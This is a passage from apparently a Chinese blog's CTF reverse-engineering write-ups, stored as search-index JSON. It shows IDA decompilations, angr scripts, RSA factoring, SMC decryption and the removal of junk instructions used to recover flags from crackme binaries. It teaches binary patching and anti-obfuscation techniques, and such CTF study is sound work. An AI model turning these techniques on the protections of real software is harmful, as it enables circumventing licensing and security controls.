Toast.makeText(MainActivity.this.getApplicationContext(), ok ? \"RIGHT!!!!\" : \"WRONG!!!!\", 1).show(); } }); } } 经含树师傅指点得知stem.loadLibrary(\"native-lib\");就是JNI的标志 把附件后缀改为zip，打开lib文件夹，里面即native-lib 四个文件夹内容基本一样，只是架构不同 随便拖一个进ida（一定要先解压。。。） 查string就能看到flag{welcome_to_naive_lib!} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:11:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x02 Codegate CTF Redvelvet die查，elf64，进ida，函数列表找main v40 = __readfsqword(40u); strcpy(s2, \"0a435f46288bb5a764d13fca6c901d3750cee73fd7689ce79ef6dc0ff8f380e5\"); v36 = 0LL; v37 = 0LL; v38 = 0LL; v39 = 0; printf(\"Your flag : \"); fgets(\u0026s, 27, edata); func1(s, v8); func2((unsigned int)v8, (unsigned int)v9); func3((unsigned int)v9, (unsigned int)v10); func4((unsigned int)v10, (unsigned int)v11); func5((unsigned int)v11, (unsigned int)v12); func6((unsigned int)v12, (unsigned int)v13, (unsigned int)v14); func7((unsigned int)v14, (unsigned int)v15, (unsigned int)v16); func8((unsigned int)v16, (unsigned int)v17, (unsigned int)v18); func9((unsigned int)v18, (unsigned int)v19, (unsigned int)v20); func10((unsigned int)v20, (unsigned int)v21, (unsigned int)v22); func11((unsigned int)v22, (unsigned int)v23, (unsigned int)v24); func12((unsigned int)v24, (unsigned int)v25, (unsigned int)v26); func13((unsigned int)v26, (unsigned int)v27, (unsigned int)v28); func14((unsigned int)v28, (unsigned int)v29, (unsigned int)v30); func15((unsigned int)v30, (unsigned int)v31, (unsigned int)v32); SHA256_Init((__int64)v6); v3 = strlen(\u0026s); SHA256_Update(v6, \u0026s, v3); SHA256_Final(v33, v6); for ( i = 0; i \u003c= 31; ++i ) sprintf(\u0026s1[2 * i], \"%02x\", (unsigned __int8)v33[i]); if ( strcmp(s1, s2) ) exit(1); printf(\"flag : {\\\" %s \\\"}\\n\", \u0026s); return 0; 基本逻辑是对输入走15个function，然后SHA256加密和s2比较 直接上angr 但这里需要注意，SHA256不可逆，所以find直接设在cmp处angr算不出来 而从SHA256之前到cmp只有一条路，所以find设在加密之前就行了,而avoid设在exit()函数处就行 In [1]: import angr In [2]: proj = angr.Project('./RedVelvet',auto_load_libs=False) In [3]: state = proj.factory.entry_state() In [4]: simgr = proj.factory.simgr(state) In [5]: simgr.explore(find=0x401537,avoid=0x4007D0) 提示Out[5]: \u003cSimulationManager with 1 found, 63 avoid\u003e 输出 In [6]: print(simgr.found[0].posix.dumps(0)) b'What_You_Wanna_Be?:)_la_la' 这里说明一下，上面的是正确答案 但其实我第一次跑出来是b'What_You_Wanna_Be?:)_lc_la,差了一个字母 当我写这篇wp时又跑了一遍，答案却是对的 两次脚本完全一样，angr也都没提示多解，但输出却不同 这才印证了RX师傅所说，粘几张聊天记录 用我的话来说就是： 1.angr对于已经走通的路不会再走第二遍 2.每一次先走哪条路（得到哪个答案）是随机的 所以出问题时（angr计算不准确）大可以多来两遍（ 第四周 2021-11-20 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:12:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x00 DMCTF2020 re3 一种常见的算法。 die查，ELF64，进ida 结合tips使用Findcrypt插件 函数列表定位main函数 __int64 __fastcall main(int a1, char **a2, char **a3) { unsigned int v3; // eax int i; // [rsp+1Ch] [rbp-C4h] char v6[96]; // [rsp+20h] [rbp-C0h] BYREF char v7[16]; // [rsp+80h] [rbp-60h] BYREF char s[32]; // [rsp+90h] [rbp-50h] BYREF char s1[40]; // [rsp+B0h] [rbp-30h] BYREF unsigned __int64 v10; // [rsp+D8h] [rbp-8h] v10 = __readfsqword(0x28u); puts(::s); memset(s, 0, 0x14uLL); read(0, s, 5uLL); sub_90A(v6); v3 = strlen(s); sub_956(v6, s, v3); sub_AA4(v6, v7); for ( i = 0; i \u003c= 15; ++i ) sprintf(\u0026s1[2 * i], \"%02x\", (unsigned __int8)v7[i]); if ( !strcmp(s1, Big_Numbers1_203060) ) printf(\"right\"); getchar(); return 0LL; } Findcrypt结果 .data:0000000000203060 global Big_Numbers1_203060 $c0 b'21232f297a57a5a743894a0e4a801fc3' 难道有种算法叫bignumbers？ 百度无果，于是尝试搞懂加密逻辑，手动逆（天真.jpg) 然后就没有然后了（ 偷看师傅们的题解,原来bignumbers是MD5的密文？？？ 网站撞出flag{admin} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:12:1","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x01 ACTF2020 Oruga 又是熟悉的迷宫……等下这是什么东西？ die查，Elf64，进ida 迷宫逻辑函数 _BOOL8 __fastcall sub_78A(__int64 a1) { int v2; // [rsp+Ch] [rbp-Ch] int v3; // [rsp+10h] [rbp-8h] int v4; // [rsp+14h] [rbp-4h] v2 = 0; v3 = 5; v4 = 0; while ( byte_201020[v2] != 33 ) { v2 -= v4; if ( *(_BYTE *)(v3 + a1) != 'W' || v4 == -16 ) { if ( *(_BYTE *)(v3 + a1) != 'E' || v4 == 1 ) { if ( *(_BYTE *)(v3 + a1) != 'M' || v4 == 16 ) { if ( *(_BYTE *)(v3 + a1) != 'J' || v4 == -1 ) return 0LL; v4 = -1; } else { v4 = 16; } } else { v4 = 1; } } else { v4 = -16; } ++v3; while ( !byte_201020[v2] ) { if ( v4 == -1 \u0026\u0026 (v2 \u0026 0xF) == 0 ) return 0LL; if ( v4 == 1 \u0026\u0026 v2 % 16 == 15 ) return 0LL; if ( v4 == 16 \u0026\u0026 (unsigned int)(v2 - 240) \u003c= 0xF ) return 0LL; if ( v4 == -16 \u0026\u0026 (unsigned int)(v2 + 15) \u003c= 0x1E ) return 0LL; v2 += v4; } } return *(_BYTE *)(v3 + a1) == 125; } 可以看出byte_201020是地图，共256byte，即16*16的地图 v2是当前所在的位置，v4是偏移量，1-right，-1-left，16-down，-16-up 上面的while里四个if可以直接对应else给v4赋值，即W-up E-right M-down J-left 下面的while函数里四个if应该是边界判断 然后循环一直往一个方向走，直到碰到字符 知道了这些，才能搞懂上面四个if里||v4==xx这个条件是在干啥 可以发现这个条件和下面else里给v4的赋值是一样的 即如果下一步和上一步是一样的，但上一步已经走到了这个方向所能走的最远处，这一步就是无效的 如果出现无效的重复命令，if判断会一路畅通，直接return 0 至此，手动走地图得flag：actf{MEWEMEWJMEWJM} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:13:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0×02 网鼎杯2020 signal 尝试一下某个自动化逆向工具？ 感谢RX细心又耐心讲解符号执行 angr直接搞他 project = angr.Project('./signal.exe',auto_load_libs = False) state = project.factory.entry_state() simgr = project.factory.simgr(state) simgr.explore(find = 0x40179E,avoid =0x401539) print(simgr.found[0].posix.dumps(0)) 得flag{757515121f3d478}，真香 第三周 2021-11-13 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:14:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0×00 SUCTF2019 Signin 你认识这个算法嘛 不认识，然后根据题解先去学RSA和gmpy2库，断断续续学了几天（（ 贴个链接吧，便于以后复习 RSA gmpy2库常见函数 die查壳，无，然后进ida，直接根据函数列表定位main函数 __int64 __fastcall main(int a1, char **a2, char **a3) { char v4[16]; // [rsp+0h] [rbp-4A0h] BYREF char v5[16]; // [rsp+10h] [rbp-490h] BYREF char v6[16]; // [rsp+20h] [rbp-480h] BYREF char v7[16]; // [rsp+30h] [rbp-470h] BYREF char v8[112]; // [rsp+40h] [rbp-460h] BYREF char v9[1000]; // [rsp+B0h] [rbp-3F0h] BYREF unsigned __int64 v10; // [rsp+498h] [rbp-8h] v10 = __readfsqword(0x28u); puts(\"[sign in]\"); printf(\"[input your flag]: \"); __isoc99_scanf(\"%99s\", v8); sub_96A(v8, v9); __gmpz_init_set_str(v7, \"ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\", 16LL); __gmpz_init_set_str(v6, v9, 16LL); __gmpz_init_set_str(v4, \"103461035900816914121390101299049044413950405173712170434161686539878160984549\", 10LL); __gmpz_init_set_str(v5, \"65537\", 10LL); __gmpz_powm(v6, v6, v5, v4); if ( (unsigned int)__gmpz_cmp(v6, v7) ) puts(\"GG!\"); else puts(\"TTTTTTTTTTql!\"); return 0LL; } 根据RSA的形式稍微重命名一下变量 v10 = __readfsqword(0x28u); puts(\"[sign in]\"); printf(\"[input your flag]: \"); __isoc99_scanf(\"%99s\", input); sub_96A(input, v9); __gmpz_init_set_str(c, \"ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\", 16LL); __gmpz_init_set_str(calc, v9, 16LL); __gmpz_init_set_str(n, \"103461035900816914121390101299049044413950405173712170434161686539878160984549\", 10LL); __gmpz_init_set_str(e, \"65537\", 10LL); __gmpz_powm(calc, calc, e, n); if ( (unsigned int)__gmpz_cmp(calc, c) ) // calc是根据input计算出的密文，c是实际的密文 puts(\"GG!\"); else puts(\"TTTTTTTTTTql!\"); return 0LL; 先用yafu分解n，由于写这篇文章时是第二次分解n所以比较快 C:\\Users\\DX3906\u003eD:\\reserve\\yafu\\yafu-x64.exe factor(103461035900816914121390101299049044413950405173712170434161686539878160984549) fac: factoring 103461035900816914121390101299049044413950405173712170434161686539878160984549 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits starting SIQS on c78: 103461035900816914121390101299049044413950405173712170434161686539878160984549 ==== sieving in progress (1 thread): 36224 relations needed ==== ==== Press ctrl-c to abort and save state ==== SIQS elapsed time = 1.0985 seconds. Total factoring time = 1.1195 seconds ***factors found*** P39 = 282164587459512124844245113950593348271 P39 = 366669102002966856876605669837014229419 ans = 1 得到 p=282164587459512124844245113950593348271 q=366669102002966856876605669837014229419 已知n,p,q,e，先求d import gmpy2 n=103461035900816914121390101299049044413950405173712170434161686539878160984549 p=282164587459512124844245113950593348271 q=366669102002966856876605669837014229419 e=65537 l=(p-1)*(q-1) d=gmpy2.invert(e,l) 已知n,d,c,求明文 c=0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35 flag=gmpy2.powmod(c,d,n) from Crypto.Util.number import * print(long_to_bytes(flag)) # b'suctf{Pwn_@_hundred_years}' ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:15:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0×01 FlareOn6 Overlang die查看文件信息，PE32，拖进ida 竟然就三个函数，start函数应该是主要的 int __stdcall start(int a1, int a2, int a3, int a4) { CHAR Text[128]; // [esp+0h] [ebp-84h] BYREF int v6; // [esp+80h] [ebp-4h] v6 = sub_401160(Text, \u0026unk_402008, 28); Text[v6] = 0; MessageBoxA(0, Text, Caption, 0); return 0; } sub_401160函数像是把unk_402008的前28位复制给Text，然后通过MessageBoxA输出Text和Caption 这里我们可以打开unk_402008看看 .rdata:00402008 unk_402008 db 0E0h ; DATA XREF: start+B↑o .rdata:00402009 db 81h .rdata:0040200A db 89h .rdata:0040200B db 0C0h .rdata:0040200C db 0A0h .rdata:0040200D db 0C1h .rdata:0040200E db 0AEh .rdata:0040200F db 0E0h .rdata:00402010 db 81h .rdata:00402011 db 0A5h .rdata:00402012 db 0C1h .rdata:00402013 db 0B6h .rdata:00402014 db 0F0h .rdata:00402015 db 80h ; € .rdata:00402016 db 81h .rdata:00402017 db 0A5h .rdata:00402018 db 0E0h .rdata:00402019 db 81h .rdata:0040201A db 0B2h .rdata:0040201B db 0F0h .rdata:0040201C db 80h ; € .rdata:0040201D db 80h ; € .rdata:0040201E db 0A0h .rdata:0040201F db 0E0h .rdata:00402020 db 81h .rdata:00402021 db 0A2h .rdata:00402022 db 72h ; r .rdata:00402023 db 6Fh ; o .rdata:00402024 db 0C1h .rdata:00402025 db 0ABh .rdata:00402026 db 65h ; e .rdata:00402027 db 0E0h .rdata:00402028 db 80h ; € .rdata:00402029 db 0A0h .rdata:0040202A db 0E0h .rdata:0040202B db 81h .rdata:0040202C db 0B4h .rdata:0040202D db 0E0h .rdata:0040202E db 81h .rdata:0040202F db 0A8h .rdata:00402030 db 0C1h .rdata:00402031 db 0A5h .rdata:00402032 db 20h .rdata:00402033 db 0C1h .rdata:00402034 db 0A5h .rdata:00402035 db 0E0h .rdata:00402036 db 81h .rdata:00402037 db 0AEh .rdata:00402038 db 63h ; c .rdata:00402039 db 0C1h .rdata:0040203A db 0AFh .rdata:0040203B db 0E0h .rdata:0040203C db 81h .rdata:0040203D db 0A4h .rdata:0040203E db 0F0h .rdata:0040203F db 80h ; € .rdata:00402040 db 81h .rdata:00402041 db 0A9h .rdata:00402042 db 6Eh ; n .rdata:00402043 db 0C1h .rdata:00402044 db 0A7h .rdata:00402045 db 0C0h .rdata:00402046 db 0BAh .rdata:00402047 db 20h .rdata:00402048 db 49h ; I .rdata:00402049 db 0F0h .rdata:0040204A db 80h ; € .rdata:0040204B db 81h .rdata:0040204C db 9Fh .rdata:0040204D db 0C1h .rdata:0040204E db 0A1h .rdata:0040204F db 0C1h .rdata:00402050 db 9Fh .rdata:00402051 db 0C1h .rdata:00402052 db 8Dh .rdata:00402053 db 0E0h .rdata:00402054 db 81h .rdata:00402055 db 9Fh .rdata:00402056 db 0C1h .rdata:00402057 db 0B4h .rdata:00402058 db 0F0h .rdata:00402059 db 80h ; € .rdata:0040205A db 81h .rdata:0040205B db 9Fh .rdata:0040205C db 0F0h .rdata:0040205D db 80h ; € .rdata:0040205E db 81h .rdata:0040205F db 0A8h .rdata:00402060 db 0C1h .rdata:00402061 db 9Fh .rdata:00402062 db 0F0h .rdata:00402063 db 80h ; € .rdata:00402064 db 81h .rdata:00402065 db 0A5h .rdata:00402066 db 0E0h .rdata:00402067 db 81h .rdata:00402068 db 9Fh .rdata:00402069 db 0C1h .rdata:0040206A db 0A5h .rdata:0040206B db 0E0h .rdata:0040206C db 81h .rdata:0040206D db 9Fh .rdata:0040206E db 0F0h .rdata:0040206F db 80h ; € .rdata:00402070 db 81h .rdata:00402071 db 0AEh .rdata:00402072 db 0C1h .rdata:00402073 db 9Fh .rdata:00402074 db 0F0h .rdata:00402075 db 80h ; € .rdata:00402076 db 81h .rdata:00402077 db 83h .rdata:00402078 db 0C1h .rdata:00402079 db 9Fh .rdata:0040207A db 0E0h .rdata:0040207B db 81h .rdata:0040207C db 0AFh .rdata:0040207D db 0E0h .rdata:0040207E db 81h .rdata:0040207F db 9Fh .rdata:00402080 db 0C1h .rdata:00402081 db 84h .rdata:00402082 db 5Fh ; _ .rdata:00402083 db 0E0h .rdata:00402084 db 81h .rdata:00402085 db 0A9h .rdata:00402086 db 0F0h .rdata:00402087 db 80h ; € .rdata:00402088 db 81h .rdata:00402089 db 9Fh .rdata:0040208A db 6Eh ; n .rdata:0040208B db 0E0h .rdata:0040208C db 81h .rdata:0040208D db 9Fh .rdata:0040208E db 0E0h .rdata:0040208F db 81h .rdata:00402090 db 0A7h .rdata:00402091 db 0E0h .rdata:00402092 db 81h .rdata:00402093 db 80h ; € .rdata:00402094 db 0F0h .rdata:00402095 db 80h ; € .rdata:00402096 db 81h .rdata:00402097 db 0A6h .rdata:00402098 db 0F0h .rdata:00402099 db 80h ; € .rdata:0040209A db 81h .rdata:0040209B db 0ACh .rdata:0","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:16:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0×02 BJDCTF2020 easy 和上道题有异曲同工之处？ die查，结果PE32，进ida 直接定位main函数 int __cdecl main(int argc, const char **argv, const char **envp) { __time32_t Time; // [esp+10h] [ebp-3F0h] BYREF struct tm *v5; // [esp+3FCh] [ebp-4h] __main(); time(\u0026Time); v5 = localtime(\u0026Time); puts(\"Can you find me?\\n\"); system(\"pause\"); return 0; } 各种time给我整蒙了，特意百度查了一下发现好像真没什么用 和上一题有异曲同工之妙?直接去翻参数列表 .text:00401725 push ebp .text:00401726 mov ebp, esp .text:00401728 and esp, 0FFFFFFF0h .text:0040172B sub esp, 400h .text:00401731 call ___main .text:00401736 lea eax, [esp+400h+var_3F0] .text:0040173A mov [esp+400h+Time], eax ; Time .text:0040173D call _time .text:00401742 lea eax, [esp+400h+var_3F0] .text:00401746 mov [esp+400h+Time], eax ; Time .text:00401749 call _localtime .text:0040174E mov [esp+400h+var_4], eax .text:00401755 mov [esp+400h+Time], offset Buffer ; \"Can you find me?\\n\" .text:0040175C call _puts .text:00401761 mov [esp+400h+Time], offset Command ; \"pause\" .text:00401768 call _system .text:0040176D mov eax, 0 .text:00401772 leave .text:00401773 retn 也没发现什么有用的，毫无头绪 翻函数列表的时候发现了问题，就是这个_ques函数， int ques() { int v0; // edx int result; // eax int v2[50]; // [esp+20h] [ebp-128h] BYREF int v3; // [esp+E8h] [ebp-60h] int v4[10]; // [esp+ECh] [ebp-5Ch] int j; // [esp+114h] [ebp-34h] __int64 v6; // [esp+118h] [ebp-30h] int v7; // [esp+124h] [ebp-24h] int v8; // [esp+128h] [ebp-20h] int i; // [esp+12Ch] [ebp-1Ch] v3 = 2147122737; v4[0] = 140540; v4[1] = -2008399303; v4[2] = 141956; v4[3] = 139457077; v4[4] = 262023; v4[5] = -2008923597; v4[6] = 143749; v4[7] = 2118271985; v4[8] = 143868; for ( i = 0; i \u003c= 4; ++i ) { memset(v2, 0, sizeof(v2)); v8 = 0; v7 = 0; v0 = v4[2 * i]; LODWORD(v6) = *(\u0026v3 + 2 * i); HIDWORD(v6) = v0; while ( v6 \u003e 0 ) { v2[v8++] = v6 % 2; v6 /= 2i64; } for ( j = 50; j \u003e= 0; --j ) { if ( v2[j] ) { if ( v2[j] == 1 ) { putchar(42); ++v7; } } else { putchar(32); ++v7; } if ( !(v7 % 5) ) putchar(32); } result = putchar(10); } return result; } 从感觉上来说一般能看懂的都是有用的，然而按x查交叉引用的时候却显示没有地方调用它 于是盲猜前面没啥用的各种time函数就是让我patch的，搞他（我这里改了第11行 .text:00401725 push ebp .text:00401726 mov ebp, esp .text:00401728 and esp, 0FFFFFFF0h .text:0040172B sub esp, 400h .text:00401731 call ___main .text:00401736 lea eax, [esp+400h+var_3F0] .text:0040173A mov [esp+400h+Time], eax ; Time .text:0040173D call _time .text:00401742 lea eax, [esp+400h+var_3F0] .text:00401746 mov [esp+400h+Time], eax ; Time .text:00401749 call _ques ; Keypatch modified this from: .text:00401749 ; call _localtime .text:0040174E mov [esp+400h+var_4], eax .text:00401755 mov [esp+400h+Time], offset Buffer ; \"Can you find me?\\n\" .text:0040175C call _puts .text:00401761 mov [esp+400h+Time], offset Command ; \"pause\" .text:00401768 call _system .text:0040176D mov eax, 0 .text:00401772 leave .text:00401773 retn apply一下，然后重新运行exe，成功！ 第二周 2021-11-05 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:16:1","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0×00 从 CNSS 偷来的 SMC SMC是什么? 看完tips尝试一下 string窗口定位主函数 .text:00408ACE push offset aPleaseInputYou ; \"Please input your code(less than 30 cha\"... .text:00408AD3 call sub_404629 .text:00408AD8 add esp, 4 .text:00408ADB push 64h ; 'd' .text:00408ADD push offset unk_4DFEF8 .text:00408AE2 push offset aS ; \"%s\" .text:00408AE7 call sub_4023EC .text:00408AEC add esp, 0Ch .text:00408AEF push offset loc_408B06 .text:00408AF4 push 138h .text:00408AF9 push offset loc_408B06 .text:00408AFE call sub_4022AC .text:00408B03 add esp, 0Ch 定位问题函数sub_4022AC int __cdecl sub_4088D0(int a1, int a2, int a3) { int result; // eax int i; // [esp+D0h] [ebp-8h] for ( i = 0; ; ++i ) { result = i; if ( i \u003e= a2 ) break; *(_BYTE *)(i + a3) = byte_4DF000 ^ *(_BYTE *)(i + a1); } return result; } idaPython 搞他 from ida_bytes import * for i in range(0x138): patch_byte(0x408B06+i,get_byte(0x408B06+i)^74) 按照步骤来到函数头CreatFonction，结果就出问题了 报错 .text:00408B19: The function has undefined instruction/data at the specified address. Your request has been put in the autoanalysis queue. 开始以为是前面哪里做错了，又重复了几遍，一样的结果 请教RX大神发现问题 .text:00408B06 mov dword ptr [ebp-0Ch], 1 .text:00408B0D mov dword ptr [ebp-8], 1 .text:00408B14 push 4DFEF8h .text:00408B14 ; --------------------------------------------------------------------------- .text:00408B19 db 0E8h .text:00408B1A retn 0FF95h .text:00408B1A ; --------------------------------------------------------------------------- .text:00408B1D db 0FFh 这里ida识别错了 按c重新识别为code，一切正常了 重新CreateFunction接F5终于看到主函数 int __cdecl main_0(int argc, const char **argv, const char **envp) { signed int j; // [esp+D4h] [ebp-3Ch] int i; // [esp+E0h] [ebp-30h] char v6; // [esp+EFh] [ebp-21h] signed int v7; // [esp+F8h] [ebp-18h] int v8; // [esp+104h] [ebp-Ch] int v9; // [esp+108h] [ebp-8h] sub_404629(\"Please input your code(less than 30 characters): \"); sub_4023EC(\"%s\", Str); sub_4022AC((int)\u0026loc_408B06, 312, (int)\u0026loc_408B06); v8 = 1; v9 = 1; v7 = j__strlen(Str); v6 = 0; if ( v7 == 23 ) { for ( i = 0; i \u003c 23; ++i ) { switch ( Str[i] ) { case 'a': --v9; break; case 'd': ++v9; break; case 's': ++v8; break; case 'w': --v8; break; default: break; } if ( aSE[8 * v8 + v9] == 35 ) break; if ( aSE[8 * v8 + v9] == 69 ) { v6 = 1; break; } } } if ( v6 ) { for ( j = 0; j \u003c v7; ++j ) byte_4DF04C[j] ^= Str[j]; sub_404629(\"%s\\n\"); } j__system(\"pause\"); return 0; } 经典地图题,aSE数组存地图，加回车得地图 ######## #S # # ## # # ##### # # ## # ####E# # # ######## w s a d十分人性化，好评 第一次用py写脚本 key = \"dsddwddssasaaaassdddddw\" magic = [39, 61, 55, 55, 12, 33, 5, 70, 10, 62, 32, 44, 34, 62,71, 44, 18, 59, 41, 5, 86, 1, 10] for i in range(0,23): print( chr( magic[i] ^ ord(key[i]) ), end=\"\") # CNSS{Ea5y_SMC_\u0026_a_Ma2e} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:17:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0×01 ByteCTF 2020 AWD TikTokAdmin 简单花指令 题目劝退，学习了一波花指令是啥再来做题 根据题目，在string窗口查找Delete，找到了发生错误的部分 .text:00000000000080D4 loc_80D4: ; CODE XREF: .text:000000000000805C↑j .text:00000000000080D4 lea rsi, aWeNeedToReconf ; \"We need to reconfirm the authority!\" .text:00000000000080DB lea rdi, _ZSt4cout ; std::cout .text:00000000000080E2 call __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(std::ostream \u0026,char const*) .text:00000000000080E7 mov rdx, rax .text:00000000000080EA mov rax, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr .text:00000000000080F1 mov rsi, rax .text:00000000000080F4 mov rdi, rdx .text:00000000000080F7 call __ZNSolsEPFRSoS_E ; std::ostream::operator\u003c\u003c(std::ostream \u0026 (*)(std::ostream \u0026)) .text:00000000000080FC lea rsi, aPleaseInputThe ; \"Please input the super root's password:\"... .text:0000000000008103 mov rdi, rax .text:0000000000008106 call __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(std::ostream \u0026,char const*) .text:000000000000810B lea rax, [rbp-90h] .text:0000000000008112 mov rsi, rax .text:0000000000008115 lea rdi, _ZSt3cin ; std::cin .text:000000000000811C call __ZStrsIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7__cxx1112basic_stringIS4_S5_T1_EE ; std::operator\u003e\u003e\u003cchar\u003e(std::istream \u0026,std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e \u0026) .text:0000000000008121 jz short near ptr loc_8125+1 .text:0000000000008123 jnz short near ptr loc_8125+1 .text:0000000000008125 .text:0000000000008125 loc_8125: ; CODE XREF: .text:0000000000008121↑j .text:0000000000008125 ; .text:0000000000008123↑j .text:0000000000008125 call near ptr 70860E72h .text:0000000000008125 ; --------------------------------------------------------------------------- .text:000000000000812A dw 0FFFFh, 48FFh, 0C789h .text:0000000000008130 dq 0C38948FFFFB56BE8h, 48FFFFFF70858D48h, 48FFFFB489E8C789h .text:0000000000008130 dq 8948B0458D48C189h, 0E8C78948CE8948DAh, 0B0458D48FFFFB584h .text:0000000000008130 dq 358D480000000DBAh, 0E8C7894800007B1Dh, 840FC085FFFFB48Ch .text:0000000000008130 dq 14358D48000000F6h, 0DEF63D8D4800007Bh, 48FFFFB5E1E80000h .text:0000000000008130 dq 8948B0458D48C289h, 0FFB5CFE8D78948C6h, 7AFD358D48FFh 问题出在了jz（为0跳转）和jnz（不为0跳转）同时存在，并插入了0xE8（call的机器码）使ida识别出错 解决方法先把call按u改成未定义,效果如图 .text:0000000000008125 db 0E8h .text:0000000000008126 unk_8126 db 48h ; H ; CODE XREF: .text:0000000000008121↑j .text:0000000000008126 ; .text:0000000000008123↑j .text:0000000000008127 db 8Dh .text:0000000000008128 db 85h .text:0000000000008129 db 70h ; p .text:000000000000812A dw 0FFFFh, 48FFh, 0C789h 然后把0xE8 patch成nop（空），其他数据按c重新分析成代码 .text:0000000000008123 ; --------------------------------------------------------------------------- .text:0000000000008125 db 90h ; Keypatch modified this from: .text:0000000000008125 ; db 0E8h .text:0000000000008125 ; Keypatch padded NOP to next boundary: 1 bytes .text:0000000000008126 ; --------------------------------------------------------------------------- .text:0000000000008126 .text:0000000000008126 loc_8126: ; CODE XREF: .text:0000000000008121↑j .text:0000000000008126 ; .text:0000000000008123↑j .text:0000000000008126 lea rax, [rbp-90h] .text:000000000000812D mov rdi, rax .text:0000000000008130 call __ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE4sizeEv ; std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e::size(void) .text:0000000000008135 mov rbx, rax .text:0000000000008138 lea rax, [rbp-90h] .text:000000000000813F mov rdi, rax .text:0000000000008142 call __ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv ; std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e::c_str(void) .text:0000000000008147 mov rcx, rax .text:000000000000814A lea rax, [rbp-50h] .text:000000000000814E mov rdx, rbx .text:0000000000008151 mov rsi, rcx 然后发现下面还有一个一样的错误，相同办法解决 最后来到函数头Create Function， 完事后到虚拟机上看一眼 dx3906@","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:18:0","tags":["CTF","reverse"],"title":"强壮逆向人wp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0×02 BJDCTF 2020 老八的小汉堡 游戏真不错，但题实话说属于没题解不会做系列（ 下了个dnspy，根据题解打开Data/Managed目录下的Assembly-CSharp.dll 搜索字符串“美汁汁”定位主函数 public class ButtonSpawnFruit : MonoBehaviour { // Token: 0x0600000A RID: 10 RVA: 0x00002110 File Offset: 0x00000310 public static string Md5(string str) { byte[] bytes = Encoding.UTF8.GetBytes(str); byte[] array = MD5.Create().ComputeHash(bytes); StringBuilder stringBuilder = new StringBuilder(); foreach (byte b in array) { stringBuilder.Append(b.ToString(\"X2\")); } return stringBuilder.ToString().Substring(0, 20); } // Token: 0x0600000B RID: 11 RVA: 0x00002170 File Offset: 0x00000370 public static string Sha1(string str) { byte[] bytes = 